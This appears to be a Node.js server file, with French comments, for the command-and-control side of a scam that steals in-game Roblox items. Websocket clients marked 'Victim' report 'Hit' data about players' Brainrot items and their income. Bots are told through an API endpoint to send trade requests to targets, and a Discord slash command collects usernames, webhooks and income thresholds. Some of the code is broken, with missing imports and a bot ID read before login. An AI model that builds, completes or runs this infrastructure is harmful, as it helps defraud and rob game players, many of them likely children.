const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');

const { v4: uuidv4 } = require('uuid');
const { REST, Routes, SlashCommandBuilder } = require('discord.js');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const MONGO_URI = process.env.MONGO_URI;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
const DISCORD_TOKEN = process.env.DISCORD_TOKEN;

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);

// Cache local pour le seuil
let CACHED_THRESHOLD = 10000000; 

// --- CONNEXION DB ---
mongoose.connect(MONGO_URI)
  .then(() => {
      log("✅ [DB] Connexion établie");
      loadSettings(); 
  })
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// --- MODÈLES ---
const WebHookIdSchema = new mongoose.Schema({
    webhookId: {
        type: String,
        unique: true,
        default: uuidv4
    },
    url: {
        type: String,
        required: true,
        trim: true
    },
    ownerName: {
        type: String,
        required: true,
        trim: true
    }
}, {
    timestamps: true
});

const WebHookId = mongoose.model('WebHookId', WebHookIdSchema);

const activeVictims = new Map();
const activeBots = new Map();
const activeAdmins = new Set();


app.get('/api/sendtrade', async (req, res) => {
    const { receiver, target } = req.query;
    if (!receiver || !target) return res.status(400).send("Paramètres manquants.");
    for (let i = 0; i < 5; i++) {
        const botWs = activeBots.get(receiver);
        if (botWs && botWs.readyState === WebSocket.OPEN) {
            botWs.send(JSON.stringify({ Type: "TradeRequest", TargetUser: target }));
            return res.send(`Envoyé à ${receiver}`);
        }
        await new Promise(r => setTimeout(r, 2000));
    }
    res.send("Bot offline");
});

// --- BOT DISCORD ---
const clientDiscord = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
const commands = [
    new SlashCommandBuilder()
        .setName('generate-sab-trade')
        .setDescription('Generate SAB Trade')
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Liste usernames séparés par virgule')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('URL webhook discord')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('income')
                .setDescription('Income minimum')
                .setRequired(true))
].map(cmd => cmd.toJSON());

// REGISTER COMMANDS
const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);

(async () => {
    try {
        log('🔄 Refresh des commandes slash...');
        await rest.put(
            Routes.applicationCommands(clientDiscord.user.id),
            { body: commands }
        );
        log('✅ Commandes enregistrées');
    } catch (error) {
        console.error(error);
    }
})();

clientDiscord.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'generate-sab-trade') {
        const usernames = interaction.options.getString('username');
        const webhook = interaction.options.getString('webhook');
        const income = interaction.options.getInteger('income');

        // TODO: logique plus tard

        await interaction.reply({
            content: `Commande reçue ✅\nUsernames: ${usernames}\nIncome: ${income}`,
            ephemeral: true
        });
    }
});

if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);

// --- GESTION WEBSOCKET ---
wss.on('connection', (ws, req) => {
    const params = new URLSearchParams(url.parse(req.url, true).query);
    const username = params.get('username') || "Unknown";
    const usertype = params.get('usertype') || "Unknown";
  
    if (usertype === "Admin") {
        activeAdmins.add(ws);
        log("👨‍💻 Un administrateur s'est connecté");

        ws.on('close', () => {
            activeAdmins.delete(ws);
            log("👨‍💻 Un administrateur s'est déconnecté");
        });
        return; // On s'arrête ici pour les admins
    }
  
    if (usertype === "Bot") {
        if (activeBots.has(username)) {
            log(`Bot ${username} déjà présent, remplacement...`);
            activeBots.get(username).terminate();
        }
    
        activeBots.set(username, ws);
        log(`🤖 Bot connecté : ${username}`);

        ws.on('close', () => {
            if (activeBots.get(username) === ws) {
                activeBots.delete(username);
                log(`💀 Bot déconnecté : ${username}`);
            }
        });
        return; // On s'arrête ici pour les bots
    }
  
    if (usertype === "Victim") {
        if (activeVictims.has(username)) {
            log(`Victim ${username} déjà présent, remplacement...`);
            activeVictims.get(username).terminate();
        }
    
        activeVictims.set(username, ws);
        log(`🤖 Victim connecté : ${username}`);

        ws.on('close', () => {
            if (activeVictims.get(username) === ws) {
                activeVictims.delete(username);
                log(`💀 Victim déconnecté : ${username}`);
            }
        });
      
        ws.on('message', async (msg) => {
          try {
              const data = JSON.parse(msg);
              if (data.Method === "Hit") {
                log(`🎯 Hit reçu de : ${data.Hit.Name}`);
                  
                if (data.Hit.Brainrots && data.Hit.Brainrots.length > 0) {
                  data.Hit.Brainrots.forEach((br, index) => {
                    log(`   [${index + 1}] Brainrot: ${br.Name} | Income: ${br.IncomeStr}`);
                  });
                } else {
                  log(`   ⚠️ Aucun Brainrot trouvé sur le plot.`);
                }
            }
          } catch (e) { log(`⚠️ Erreur Message WS: ${e.message}`); }
      });
      return; // On s'arrête ici pour les Victims
    }
    
});

app.use(express.static('public'));
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
